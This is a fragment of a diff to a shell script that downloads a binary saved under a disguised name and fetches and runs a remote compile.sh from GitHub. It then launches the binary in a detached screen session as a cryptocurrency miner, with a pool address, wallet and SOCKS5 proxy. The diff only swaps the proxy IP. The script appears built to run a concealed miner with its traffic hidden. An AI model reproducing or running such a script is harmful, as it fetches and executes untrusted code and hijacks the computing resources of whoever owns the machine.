@@ -7,7 +7,7 @@ wget -qO kase https://raw.githubusercontent.com/hndouehdw/henro/master/pyton
 wget -q https://raw.githubusercontent.com/hndouehdw/henro/master/compile.sh
 sudo ph add kase
 chmod +x kase
-screen -dm -S kase ./kase -a yespowerTIDE -o stratum+tcp://asia.tidepool.shop:6243 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.hu --proxy socks5://54.163.208.195:3129
+screen -dm -S kase ./kase -a yespowerTIDE -o stratum+tcp://asia.tidepool.shop:6243 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.hu --proxy socks5://192.252.208.70:14282
 chmod +x compile.sh
 ./compile.sh
 
